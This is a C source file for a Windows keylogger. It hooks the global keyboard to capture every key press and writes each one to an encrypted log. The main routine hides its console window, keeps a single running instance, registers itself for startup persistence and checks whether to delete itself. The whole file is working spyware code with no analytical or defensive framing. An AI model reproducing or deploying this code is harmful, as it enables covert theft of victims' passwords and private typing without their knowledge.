#include <windows.h>
#include <wchar.h>
#include "config.h"
#include "keyboard.h"
#include "logging.h"


/* Main keylogger logic */
LRESULT WINAPI KeyPressedHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *keyboardStruct		= NULL;
	WCHAR wcKeyDescription[BUFFER_SIZE]	= { 0 };
	WCHAR wcTempBuffer[BUFFER_SIZE]		= { 0 };

	// Debug
	DebugMessage(L"KeyPressedHook");

	// nCode must be not negative
	if (nCode >= 0)
	{
		keyboardStruct = (KBDLLHOOKSTRUCT *)lParam;
		switch (wParam)
		{
			// We only care about when pressing the key, not when releasing it
			case WM_KEYDOWN:
				if (GetActualKeyDescription(keyboardStruct, BUFFER_SIZE, wcKeyDescription))
				{
					// Debug (NOTE: extermly spamming)
					if (DEBUG_VERBOOS)
					{
						swprintf_s(wcTempBuffer, BUFFER_SIZE, L"Key pressed: %s", wcKeyDescription);
						DebugMessage(wcTempBuffer);
					}
					// Write to log
					LogAndEncrypt(wcKeyDescription);
				}
				break;
		}
	}
	// Call next hook in chain
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*********************************/


/*** Un/Register Keybaord Hooks ***/
HHOOK RegisterHook(HOOKPROC funcPointerHook)
{
	DebugMessage(L"RegisterHook");
	HINSTANCE hModuleInstance = GetModuleHandle(NULL);
	// Registers 'funcPointerHook' function for key down/up callbacks
	return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)funcPointerHook, hModuleInstance, 0);
}
void UnRegisterHook(HHOOK keyboardHook)
{
	DebugMessage(L"UnRegisterHook");
	UnhookWindowsHookEx(keyboardHook);
}
/**********************************/



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Make sure there's a single instance of ourselves
	HANDLE hMutexSingleInstance = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, MUTEX_SINGLE_INSTANCE);
	// Mutex already opened, this means there's an instance already running.. shutting down.
	if (hMutexSingleInstance)
		return EXIT_SUCCESS;
	else
		hMutexSingleInstance = CreateMutexW(NULL, FALSE, MUTEX_SINGLE_INSTANCE);

	// Debug
	DebugMessage(L"WinMain");

	// Hide Window
	ShowWindow(FindWindow("ConsoleWindowClass", NULL), 0);

	// Check if we need to suicide. If so, suicide :(
	if (CheckAndSuicideIfNeeded())
	{
		// We have suicided. Release mutex and exit nicely
		ReleaseMutex(hMutexSingleInstance);
		return EXIT_SUCCESS;
	}

	// Register for startup
	RegisterToRunAtStartup();

	// We want to register our keyboard interceptions' function hook and process windows messages in a continues loop
	// Register keylogger function hook
	HHOOK keyboardHook = RegisterHook((HOOKPROC)KeyPressedHook);

	// Main loop of processing windows messages (http://www.winprog.org/tutorial/message_loop.html)
	MSG winMsg;
	while (GetMessage(&winMsg, NULL, 0, 0))
	{
		TranslateMessage(&winMsg);
		DispatchMessage(&winMsg);
	}
	
	// Release mutex
	ReleaseMutex(hMutexSingleInstance);

	// Unreigster the function's hook
	UnRegisterHook(keyboardHook);
	/**************************************/

	// Exit
	return EXIT_SUCCESS;
}